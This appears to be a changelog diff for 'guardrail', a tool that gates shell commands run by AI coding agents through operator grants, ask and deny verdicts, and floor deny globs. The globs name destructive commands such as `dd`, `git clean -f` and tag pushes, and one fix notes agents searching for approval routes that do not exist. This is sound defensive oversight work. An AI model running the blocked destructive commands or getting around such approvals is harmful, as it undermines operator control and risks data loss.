+- **Feature (#173, #272, #273, ADR-0027): operator-issued grants for one exact command.**
+  `guardrail approvals grant --repo <path> --rule <id> --command '<exact-command>'`
+  authorizes an exact command string without wildcarding or normalization. Single-use
+  by default (`--uses N` raises), 30-minute default TTL (capped at 24h). Interactive
+  terminal issuance only, showing verbatim quoted command text. Cannot relax
+  outward reach (`capability-external`, `capability-web-search`, `unknown-native-tool`)
+  or fail-closed backstops. Both issuance and consumption are audited under
+  `ask-allowed-by-operator-grant`; revocable via `guardrail approvals revoke`,
+  inspectable via `guardrail approvals list --grants`.
+- **Fix (#129, #265): an Ask verdict now specifies which approval path applies.**
+  Policy asks explicitly state that no approval URL, daemon, or `approvals` command
+  exists for the rule and direct the agent to prompt the operator. Broker asks surface
+  the approval URL. Prevents models from hunting for non-existent approval machinery.
+- **Feature (#242): machine-readable guidance metadata for deny verdicts.**
+  Deny verdicts carry structured metadata for downstream integration tooling.
+
+### Windows Transport & Session
+- **Feature (#253, ADR-0025): resident daemon and named-pipe transport on Windows.**
+  Persistent resident daemon/broker serves hook evaluations over Windows named pipes
+  (`\\.\pipe\`), reducing per-call evaluation latency from process-startup and AV
+  scanning overhead to sub-millisecond speeds.
+- **Feature (#248, ADR-0024): Windows agent experience improvements.**
+  MSYS mount handling, inspectable Codex wrappers, and degraded UX advisories.
+- **Fix (#266, #279): serialize local lock contention and separate lock budgets.**
+  Local session lock contention is serialized under concurrency, and local vs. OS
+  lock budgets are separated to eliminate spurious contention timeouts.
+- **Chore (#237, #238): dependency updates.**
+  Bumped `mvdan.cc/sh/v3` from 3.10.0 to 3.14.1 and `github.com/gofrs/flock` from 0.12.1
+  to 0.13.1.
+
+### Declarative Floor & Reset Work
+- **Docs (#282, #287, ADR-0028): settings files are user-owned; enforcement moves to Engine.**
+  Four-seat audit confirmed declarative floor rules in plane settings files were a
+  drifting, redundant copy of Engine policy. Settings files return to user-owned
+  content plus hook registrations only. OpenCode (Phase B: 218 entries) and Claude
+  Code (Phase C: 243 entries) scheduled for floor retirement; Antigravity (Phase A: 0
+  floor entries) confirmed at target since ADR-0008.
+- **Policy (#282, ADR-0028, openai/codex#24453): Codex established as named exception plane.**
+  Codex pre-hooks do not dispatch on Windows; its 32 native rules in
+  `~/.codex/rules/guardrail.rules` are retained as primary enforcement. Retirement
+  is gated on a measurable condition (`guardrail doctor --codex-hooks` observing
+  live runtime dispatch), not a calendar date.
+- **Feature (#282, #291): engine outage posture is loud instead of silent.**
+  SessionStart hook inspects engine self-spawn health and emits a loud warning banner
+  when the engine is unreachable, explicitly withdrawing autonomy instructions.
+  `guardrail doctor` reports engine reachability.
+- **Fix (#282 M4/C1, #297): retire no-op floor classes from Claude and OpenCode.**
+  Retired false-positive prefix globs `Bash(dd *)` (blocked harmless file copies)
+  and `Bash(git clean -f*)` (blocked `--dry-run`) from Claude and OpenCode generators;
+  retained in `CodexRules()`.
+- **Test (#249, #256, #271, #274): floor generator verifies glob matches.**
+  Generator pairs all floor globs with canonical dangerous commands, failing the
+  build on non-matching patterns (#249); caught 23 broken globs (#244). Floor
+  mediates GitHub CLI porcelain endpoints (#256), aligns globs with host
+  matchers (#271), and translates OpenCode command globs (#274).
+- **Fix (#246, #258, #259, #263): Codex diagnostics, tools, and schema drift.**
+  Separated Codex hook failure diagnostics from policy denials (#246), retained
+  raw hook diagnostics (#258), classified collaboration tools (#259), and gated
+  runtime schema drift (#263).
+
+### Tests & CI Portability
+- **Test (#240, #241, #254, #260, #268, #281, #285, #294): host coordinate & child-env isolation.**
+  Materialized host-native contract paths (#240, #285, #294); isolated adversarial child
+  roots (#241, #260); expected host filesystem root on Windows (#254); toleration for
+  concurrent repo walks in child-env guard (#268); enrolled adversarial broker on
+  Windows (#281).
+- **Test (#284): bound POSIX cd semantics on Windows.**
+  Bounded shell-lexical vs host-probing cd resolution under the ADR-0023 seam.
+- **CI (#261): expose full portability suite on Windows.**
+  Exposed full portability test suite on Windows CI runners.
+
+### Documentation & Operator Guidance
+- **Docs (#292): operator release notes for v0.23.0-dev.**
+  Added `docs/release-notes/v0.23.0-dev.md` detailing operational policy changes,
+  credentialed CLIs, operator grants, and Windows performance.
+- **Docs (#282, #296): reset Phase 1 execution & verification checklist.**
+  Added `docs/reset-phase-1-checklist.md` providing step-by-step operator runbooks
+  for OpenCode and Claude Code floor retirement, doctor verification, and rollback paths.
+- **Feature (#236, #276): doctor reports credential posture and operator hardening guide.**
+  `guardrail doctor` inspects GitHub scopes, account count, kubectl contexts, and
+  credential environment variable names without exposing values; added
+  `docs/operator-hardening.md` on token minimization and provider-side boundaries.
+- **Feature (#243): audit verdict reporting and ask pressure metrics.**
+  `guardrail audit --verdicts` reports policy decisions by rule (deny/ask/allow counts,
+  session concentration) and identifies ask fatigue.
+- **Docs (#247): error-message discipline.**
+  Added documentation on actionable error messages and failure mode prevention.
+
+## v0.22.0-dev
 - **Fix (#218): publishing a tag now asks.** The floor and the Engine asked for
   `git push --tags`, `git push * main` and a deletion refspec, but a *named*
   tag push matched none of them: `git push origin v0.21.8-dev` allowed, and a
